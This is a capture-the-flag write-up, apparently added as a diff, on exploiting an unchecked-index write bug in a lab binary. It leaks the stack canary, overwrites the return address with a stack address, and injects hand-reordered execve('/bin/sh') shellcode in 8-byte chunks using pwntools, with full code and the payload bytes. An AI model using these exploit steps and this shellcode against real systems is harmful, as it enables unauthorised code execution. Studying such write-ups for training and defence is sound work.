@@ -1,0 +1,130 @@
+While analysing the code we notice a 'Write What Where' vulnerability where the index is not checked so we can write input * 8 of the next bytes.
+
+This means we can leak the canary easily, we know that the canary is stored in [rbp-0x8] from reading the assembly from the program therefore
+we can add a breakpoint to when the cookie is "eaten" and use x\g $rbp-0x8 when the breakpoint is hit, we then continue and check if the value is the same.
+
+In this case the index is 9. Let's automatize it:
+
+
+data = p.read()        #username prompt
+p.sendline(b'hacker')  #username
+data2 = p.read()       #junk
+p.sendline(b'9')
+data3 = p.read()
+p.sendline(b'eat')
+data4 = p.read()
+data5 = p.read()
+data6 = p.read()
+data7 = p.read()
+data8 = p.read()
+data9 = p.read()
+data10 = p.read()
+data11 = p.read()
+data12 = p.read()
+data13 = p.read()
+data14 = p.read()    #data14 holds our cookie
+regular_hexa = re.search(r'([a-fA-F0-9]{16})', data14.decode()).group(1) #We just get the hexadecimal, not decoded yet so has format 2fe16600...
+
+We will try now to test if we got the correct canary:
+p.sendline(b'-1')
+p.sendline(regular_hexa)
+
+And it worked! The function accepts regular hex, it doesn't have to be encoded!!
+
+Let's now try to corrupt the RIP (so i=9 is the cookie, i=10 can be the old RBP or RSP, i=11??):
+
+p.sendline(b'11')
+p.sendline(b'store')
+p.sendline("0x7fffffffece0")
+
+And it worked, the way the program handles input you don't need to convert to bytes or little endian.
+
+You may wonder how did you get the address above (0x7fffffffece0) ?
+
+It's time to build shellcode and redirect our RIP to it! That address is what holds our shellcode, but let's find it first!
+
+Firstly I tried to use the find command:
+vmmap
+find <address start> <address finish> 'aaaaaaaa'
+
+And I got two address but these addresses where NOT where our input is. They are only used when you try to read the values with the "eat" cookie primitive.
+
+Instead a much better way to find it is by reading the assembly where our buffer starts and go from there:
+
+0x400a98:  mov     qword [rbp-0x50], 0x0
+0x400aa0:  mov     qword [rbp-0x48], 0x0
+0x400aa8:  mov     qword [rbp-0x40], 0x0
+0x400ab0:  mov     qword [rbp-0x38], 0x0
+0x400ab8:  mov     qword [rbp-0x30], 0x0
+0x400ac0:  mov     qword [rbp-0x28], 0x0
+0x400ac8:  mov     qword [rbp-0x20], 0x0
+0x400ad0:  mov     qword [rbp-0x18], 0x0
+
+Just check the address that the above vector points with x/gx $rbp-0x18 or x/gx $rbp-0x50.
+
+We can send several NOP to test if the input is truly there and it is!
+
+Time to build our shellcode. After some hours going crazy I found what is happening to our shellcode. It's getting the bytes inverted and order inverted:
+
+You can test the above by sending \x31\xf6, it's giving a completely different instruction but if you send \xf6\x31 then you are getting your desired instruction!
+The same also happens on the order of the shellcode. You need to send the payload inversed, so you would send \x90*6 and then our byte-inverted instruction \xf6\x31.
+Also when you group instructions they all get mangled so add \x90 in-between.
+
+It's very confusing and problems come when placing the /bin/sh, so you must be careful and test the payload several times using:
+x\32i 0x7fffffffece0
+x\32g 0x7fffffffece0
+
+You inscrease the number of qwords the more you build your payload!
+
+Last part is you need to send your payload in partitions of 8 bytes so this may complicate the payload creation process. Here is my payload:
+
+payload = b'\x56' + b'\x90\x90\x90\x90\x90' + b'\xF6\x31' # xor esi,esi
+payload += b'\xbf\x48'+ b'\x90' * 6 # push rsi + movabs rdi, x
+payload += b'\x68\x73\x2f\x2f\x6e\x69\x62\x2f' # /bin/shell 
+payload += b'\x90' * 3 + b'\x54' + b'\x90' * 3 + b'\x57'  # push rdi + push rsp
+payload += b'\x58' + 5 * b'\x90' + b'\x3b\x6a' # pop rdi + push 0x3b
+payload += b'\x90' * 7 + b'\x5f' #pop rax
+payload += b'\x90' * 6 + b'\x05\x0f' #Syscall
+
+Took a while to make, since you have to split it 7 times, and in each split inverse the instruction-byte order + inverse the payload order + can't clump instructions together + padding.
+
+After that you just split it and send each part:
+
+hex_payload = payload.hex()
+part1 = hex_payload[:16]
+part2 = hex_payload[16:32]
+part3 = hex_payload[32:48]
+part4 = hex_payload[48:64]
+part5 = hex_payload[64:80]
+part6 = hex_payload[80:96]
+part7 = hex_payload[96:114]
+
+p.sendline(b'0')
+p.sendline(b'store')
+p.sendline("0x" + part1)
+
+p.sendline(b'1')
+p.sendline(b'store')
+p.sendline("0x" + part2)
+
+p.sendline(b'2')
+p.sendline(b'store')
+p.sendline("0x" + part3)
+
+p.sendline(b'3')
+p.sendline(b'store')
+p.sendline("0x" + part4)
+
+p.sendline(b'4')
+p.sendline(b'store')
+p.sendline("0x" + part5)
+
+p.sendline(b'5')
+p.sendline(b'store')
+p.sendline("0x" + part6)
+
+p.sendline(b'6')
+p.sendline(b'store')
+p.sendline("0x" + part7)
+
+And you should get a shell. As always you can download my script!
